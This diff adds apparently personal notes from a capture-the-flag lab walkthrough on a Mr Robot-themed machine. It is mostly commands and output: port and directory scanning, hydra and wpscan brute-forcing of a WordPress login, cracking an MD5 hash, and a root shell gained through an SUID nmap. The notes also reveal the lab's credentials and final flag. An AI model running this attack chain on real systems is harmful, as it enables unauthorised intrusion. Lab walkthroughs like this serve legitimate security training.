@@ -1,0 +1,129 @@
+-->   sudo masscan -e tun0 -p1-65535, --U:1-65535 10.10.151.165 --rate=100
+      [sudo] password for su: 
+      CONF: unknown config option: U=1-65535
+      
+      Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2020-09-21 05:31:09 GMT
+       -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
+      Initiating SYN Stealth Scan
+      Scanning 1 hosts [65535 ports/host]
+      Discovered open port 443/tcp on 10.10.151.165                                  
+      Discovered open port 80/tcp on 10.10.151.165                                   
+      ^Cwaiting several seconds to exit...
+
+
+-->   nmap -sC -sV -p80,443 -oA nmap/mrRobot 10.10.151.165
+      Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-21 11:13 IST
+      Nmap scan report for 10.10.151.165
+      Host is up (0.42s latency).
+      
+      PORT    STATE SERVICE  VERSION
+      80/tcp  open  http     Apache httpd
+      |_http-server-header: Apache
+      |_http-title: Site doesn't have a title (text/html).
+      443/tcp open  ssl/http Apache httpd
+      |_http-server-header: Apache
+      |_http-title: Site doesn't have a title (text/html).
+      | ssl-cert: Subject: commonName=www.example.com
+      | Not valid before: 2015-09-16T10:45:03
+      |_Not valid after:  2025-09-13T10:45:03
+
+
+
+-->     sudo python3 /opt/dirsearch/dirsearch.py -u http://10.10.151.165/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e php,html -x 404,403
+        
+          _|. _ _  _  _  _ _|_    v0.3.9
+         (_||| _) (/_(_|| (_| )
+        
+        Extensions: php, html | HTTP method: GET | Threads: 20 | Wordlist size: 220521
+        
+        Error Log: /opt/dirsearch/logs/errors-20-09-21_11-14-45.log
+        
+        Target: http://10.10.151.165/
+        
+        Output File: /opt/dirsearch/reports/10.10.151.165/_20-09-21_11-14-45.txt
+        
+        [11:14:45] Starting: 
+        [11:14:49] 301 -  236B  - /images  ->  http://10.10.151.165/images/
+        [11:14:49] 301 -  234B  - /blog  ->  http://10.10.151.165/blog/
+        [11:14:50] 301 -    0B  - /rss  ->  http://10.10.151.165/feed/
+        [11:14:50] 200 -    0B  - /sitemap
+        [11:14:50] 302 -    0B  - /login  ->  http://10.10.151.165/wp-login.php
+        [11:14:53] 301 -    0B  - /0  ->  http://10.10.151.165/0/
+        [11:14:53] 301 -    0B  - /feed  ->  http://10.10.151.165/feed/
+        [11:14:53] 301 -  235B  - /video  ->  http://10.10.151.165/video/
+        [11:14:54] 301 -    0B  - /image  ->  http://10.10.151.165/image/
+        [11:14:55] 301 -    0B  - /atom  ->  http://10.10.151.165/feed/atom/
+        [11:14:57] 301 -  240B  - /wp-content  ->  http://10.10.151.165/wp-content/
+        [11:14:59] 301 -  235B  - /admin  ->  http://10.10.151.165/admin/
+        [11:15:00] 301 -  235B  - /audio  ->  http://10.10.151.165/audio/
+        [11:15:07] 200 -    3KB - /wp-login
+        [11:15:09] 200 -  504KB - /intro
+        [11:15:10] 301 -  233B  - /css  ->  http://10.10.151.165/css/
+        [11:15:10] 301 -    0B  - /rss2  ->  http://10.10.151.165/feed/
+        [11:15:13] 200 -  309B  - /license
+        [11:15:15] 301 -  241B  - /wp-includes  ->  http://10.10.151.165/wp-includes/
+        [11:15:20] 301 -  232B  - /js  ->  http://10.10.151.165/js/
+        [11:15:20] 301 -    0B  - /Image  ->  http://10.10.151.165/Image/
+        [11:15:36] 301 -    0B  - /rdf  ->  http://10.10.151.165/feed/rdf/
+        [11:15:37] 301 -    0B  - /page1  ->  http://10.10.151.165/
+        [11:15:39] 200 -   64B  - /readme
+        [11:15:40] 200 -   41B  - /robots
+        [11:21:07] 302 -    0B  - /dashboard  ->  http://10.10.151.165/wp-admin/
+
+
+hydra -L fsocity.dic -p admin 10.10.209.16  http-post-form "/wp-login/:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.209.16%2Fwp-admin%2F&testcookie=1:F=Invalid username"  #log from burpsute
+
+
+hydra -l Elliot -P fsocity.dic 10.10.209.16 http-post-form "/wp-login/:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.209.16%2Fwp-admin%2F&testcookie=1:S=302"
+
+Hydra took lots of time so, i tried wp-scan again to bruteforce password.
+wpscan --url 10.10.146.246 --passwords fsocity.uniq --usernames Elliot
+    Valid Combinations Found:
+     | Username: Elliot, Password: ER28-0652
+
+robot:c3fcd3d76192e4007dfb496cca67e13b
+
+john hash.txt --wordlist=/opt/rockyou.txt --format=raw-md5
+abcdefghijklmnopqrstuvwxyz (robot)
+
+find / -perm -4000 2>/dev/null
+/bin/ping
+/bin/umount
+/bin/mount
+/bin/ping6
+/bin/su
+/usr/bin/passwd
+/usr/bin/newgrp
+/usr/bin/chsh
+/usr/bin/chfn
+/usr/bin/gpasswd
+/usr/bin/sudo
+/usr/local/bin/nmap
+/usr/lib/openssh/ssh-keysign
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
+/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
+/usr/lib/pt_chown
+
+nmap --interactive
+nmap> !sh
+# id
+id
+uid=1002(robot) gid=1002(robot) euid=0(root) groups=0(root),1002(robot)
+# cd /root
+cd /root
+# ls -al
+ls -al
+total 32
+drwx------  3 root root 4096 Nov 13  2015 .
+drwxr-xr-x 22 root root 4096 Sep 16  2015 ..
+-rw-------  1 root root 4058 Nov 14  2015 .bash_history
+-rw-r--r--  1 root root 3274 Sep 16  2015 .bashrc
+drwx------  2 root root 4096 Nov 13  2015 .cache
+-rw-r--r--  1 root root    0 Nov 13  2015 firstboot_done
+-r--------  1 root root   33 Nov 13  2015 key-3-of-3.txt
+-rw-r--r--  1 root root  140 Feb 20  2014 .profile
+-rw-------  1 root root 1024 Sep 16  2015 .rnd
+# cat key-3-of-3.txt
+cat key-3-of-3.txt
+04787ddef27c3dee1ee161b21670b4e4
